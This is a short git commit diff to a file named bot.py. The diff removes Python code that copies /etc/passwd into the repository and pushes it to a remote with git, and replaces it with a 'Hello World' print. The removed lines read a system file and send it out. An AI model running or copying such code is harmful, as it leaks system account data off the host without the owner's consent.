ac364a09c98b189f428f122d9455470a62de9eda
ReverseShellOnU <158079078+ReverseShellOnU@users.noreply.github.com>
2024-02-11 23:05:22 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,13 +1,4 @@
 import os
-# Definir los comandos Bash como cadenas de texto
-comandos = [
-    "cp /etc/passwd .",
-    "git add .",
-    'git commit -m "Agregar archivo /etc/passwd a github"',
-    "git push origin master"
-]
-# Ejecutar cada comando utilizando os.system()
-for comando in comandos:
-    os.system(comando)
+print("Hello World")
 
 
